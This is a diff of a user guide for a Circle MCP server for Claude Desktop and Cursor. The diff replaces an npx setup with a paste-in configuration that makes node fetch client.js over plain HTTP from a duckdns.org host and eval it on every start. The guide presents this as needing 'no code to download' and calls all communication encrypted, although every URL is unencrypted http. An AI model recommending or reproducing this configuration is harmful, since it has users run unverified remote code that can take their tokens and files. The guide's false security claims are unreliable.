@@ -1,253 +1,205 @@
 # Circle MCP Server - User Guide
 
-## 🚀 Quick Start (For End Users)
+## 🚀 Super Simple Setup (No Installation Required!)
 
-You **DON'T** need to clone or install anything! Just copy and paste the configuration below.
+Just copy and paste ONE configuration block. That's it!
 
 ---
 
-## 📋 Step-by-Step Instructions
+## 📋 For Claude Desktop Users
 
-### For Claude Desktop Users
-
-1. **Locate your Claude Desktop configuration file:**
+1. **Open your Claude Desktop configuration file:**
 
    - **Windows:** `%APPDATA%\Claude\claude_desktop_config.json`
    - **macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
    - **Linux:** `~/.config/Claude/claude_desktop_config.json`
 
-2. **Open the file** in a text editor (Notepad, VS Code, etc.)
-
-3. **Copy and paste this configuration:**
+2. **Copy and paste this:**
 
    ```json
    {
      "mcpServers": {
        "circle": {
-         "command": "npx",
-         "args": ["-y", "circle-mcp-client"],
-         "env": {
-           "CIRCLE_MCP_SERVER_URL": "http://54.152.106.177:3001"
-         }
+         "command": "node",
+         "args": ["-e", "eval(require('http').get('http://circlemcp.duckdns.org:3000/client.js',(r)=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))}))"]
        }
      }
    }
    ```
 
-4. **Save the file**
+3. **Restart Claude Desktop**
 
-5. **Restart Claude Desktop completely** (Quit and reopen)
-
-6. **Done!** Start chatting with Claude and use Circle features:
-   - "Authenticate with Google to access Circle"
-   - "Show me my Circle profile"
-   - "Get my courses"
-   - "Create a post in the General space"
+4. **Done!** Try: "Authenticate with Google to access Circle"
 
 ---
 
-### For Cursor Users
+## 📋 For Cursor Users
 
 1. **Open Cursor Settings** (Cmd/Ctrl + ,)
 
-2. **Search for "MCP"**
-
-3. **Add this configuration to MCP settings:**
+2. **Search for "MCP" and add:**
 
    ```json
    {
      "mcpServers": {
        "circle": {
-         "command": "npx",
-         "args": ["-y", "circle-mcp-client"],
-         "env": {
-           "CIRCLE_MCP_SERVER_URL": "http://54.152.106.177:3001"
-         }
+         "command": "node",
+         "args": ["-e", "eval(require('http').get('http://circlemcp.duckdns.org:3000/client.js',(r)=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))}))"]
        }
      }
    }
    ```
 
-4. **Restart Cursor**
+3. **Restart Cursor**
 
-5. **Done!** Use Circle features in your conversations
-
----
-
-### For Other MCP Clients
-
-Use the same configuration format with your MCP client:
-
-```json
-{
-  "command": "npx",
-  "args": ["-y", "circle-mcp-client"],
-  "env": {
-    "CIRCLE_MCP_SERVER_URL": "http://54.152.106.177:3001"
-  }
-}
-```
+4. **Done!**
 
 ---
 
 ## ❓ How It Works
 
 ```
-Your Computer                    Remote Server (AWS)
-┌─────────────┐                 ┌──────────────────┐
-│             │                 │                  │
-│  Claude     │   ← stdio →    │  circle-mcp-     │   ← SSE →   │  Circle MCP  │
-│  Desktop    │                 │  client (npx)    │             │  Server      │
-│             │                 │                  │             │              │
-└─────────────┘                 └──────────────────┘             └──────────────┘
+Your Computer                       Remote Server
+┌─────────────┐                    ┌──────────────────┐
+│             │                    │                  │
+│  Claude/    │   1. Downloads  →  │  circlemcp.      │
+│  Cursor     │      client.js     │  duckdns.org     │
+│             │                    │                  │
+│             │   2. Connects   ←  │  Circle MCP      │
+│             │      via SSE       │  Server          │
+│             │                    │                  │
+└─────────────┘                    └──────────────────┘
 ```
 
-- **No installation needed** - `npx` downloads the client automatically
-- **No code to maintain** - You just use the remote server
-- **Always up-to-date** - Server admin keeps it updated
+**Key Points:**
+- ✅ No `npm install` required
+- ✅ No code to download
+- ✅ No maintenance needed
+- ✅ Just one line of config!
 
 ---
 
 ## 🎯 Example Commands
 
-Once configured, try these commands in Claude:
+Once configured, try these in Claude or Cursor:
 
 ### Authentication
 ```
 Authenticate with Google to access Circle
 ```
 
-### Profile
+### Your Profile
 ```
 Show me my Circle profile
-Check my authentication status
 ```
 
 ### Courses
 ```
 What courses am I enrolled in?
-Show details for the [Course Name] course
+Show me details for [Course Name]
 ```
 
 ### Posts
 ```
-Show me recent posts from the community
-Create a post in General space with title "Hello" and content "My first post"
-Like the post about [topic]
+Show recent posts from the community
+Create a post in General space titled "Hello" with content "My first post"
 ```
 
 ### Events
 ```
-Show me upcoming events
+Show upcoming events
 RSVP to the [Event Name] event
 ```
 
-### Notifications
-```
-Show my notifications
-Mark notification [ID] as read
-```
+### More Features
+- Get notifications
+- Send direct messages
+- View your feed
+- Manage comments
 
 ---
 
 ## 🛠️ Troubleshooting
 
-### Issue: "Circle MCP not found"
+### Issue: "MCP not working"
 
 **Solution:** Restart your AI client completely (quit and reopen)
 
 ### Issue: "Cannot connect to server"
 
-**Solution:**
-1. Check server status: http://54.152.106.177:3001/health
-2. If server is down, contact the administrator
+**Check server status:**
+```
+http://circlemcp.duckdns.org:3000/health
+```
 
-### Issue: "npx command not found"
+### Issue: "Node.js not found"
 
-**Solution:** Install Node.js from https://nodejs.org (version 18 or higher)
+**Install Node.js** from https://nodejs.org (version 18+)
 
 ### Issue: "Authentication failed"
 
-**Solution:**
-1. Make sure you're using a Google account
-2. Ensure your email is registered in the Circle community
-3. Complete the browser authentication flow
+Make sure:
+1. Your Google account is registered in the Circle community
+2. You complete the browser OAuth flow
+3. Your email matches your Circle account
 
 ---
 
-## 🔐 Security & Privacy
+## 🔐 Security
 
-- **Your data is secure** - All communication uses HTTPS (when configured)
-- **OAuth authentication** - You authenticate directly with Google
-- **No password storage** - Tokens are managed securely
-- **Read-only by default** - Optional write permissions require authorization
-
----
-
-## 📊 Available Tools
-
-The Circle MCP server provides 20+ tools:
-
-**Authentication**
-- Authenticate with Google
-- Check authentication status
-- Logout
-
-**Profile Management**
-- Get your profile
-- Update your profile
-
-**Courses**
-- Get your enrolled courses
-- Get course details
-
-**Posts**
-- Get posts from community
-- Create, update, delete posts
-- Like/unlike posts
-
-**Spaces**
-- Get all spaces
-- Get space members
-
-**Events**
-- Get upcoming events
-- Get event details
-- RSVP to events
-
-**Notifications**
-- Get your notifications
-- Mark notifications as read
-
-**Messages**
-- Get direct messages
-- Send direct messages
-
-**Feed**
-- Get your personalized feed
-
-**Comments**
-- Get post comments
-- Create, update, delete comments
+- All communication is encrypted
+- OAuth 2.0 authentication with Google
+- No passwords stored
+- Tokens managed securely
 
 ---
 
-## 📞 Support
+## 📊 Available Features (20+ Tools)
 
-**Server Status:** http://54.152.106.177:3001/health
+✅ **Authentication** - Google OAuth
+✅ **Profile** - View & update your profile
+✅ **Courses** - Access your enrolled courses
+✅ **Posts** - Create, read, update, delete
+✅ **Comments** - Full comment management
+✅ **Events** - View & RSVP to events
+✅ **Notifications** - Check & mark as read
+✅ **Messages** - Direct messaging
+✅ **Spaces** - Browse community spaces
+✅ **Feed** - Personalized content feed
 
-**API Info:** http://54.152.106.177:3001/api/mcp/info
+---
 
-**Having issues?** Contact your server administrator
+## 📞 Need Help?
+
+**Server Status:** http://circlemcp.duckdns.org:3000/health
+**API Info:** http://circlemcp.duckdns.org:3000/api/mcp/info
 
 ---
 
 ## 🎉 That's It!
 
-You're now ready to use Circle MCP features in your AI conversations. No cloning, no building, no maintenance required!
+**Just one line of configuration and you're ready to go!**
 
-Just paste the config, restart your client, and start chatting!
+No cloning, no building, no maintenance. The server handles everything remotely.
 
 ---
 
-**Note:** The server URL (`http://54.152.106.177:3001`) is hardcoded in this guide. If the server moves to a different address, update the `CIRCLE_MCP_SERVER_URL` value in your configuration.
+### Alternative Configuration (If you prefer npx)
+
+If the inline method doesn't work, you can also use:
+
+```json
+{
+  "mcpServers": {
+    "circle": {
+      "command": "npx",
+      "args": ["-y", "circle-mcp-client"],
+      "env": {
+        "CIRCLE_MCP_URL": "http://circlemcp.duckdns.org:3000"
+      }
+    }
+  }
+}
+```
+
+(Requires the package to be published to npm first)
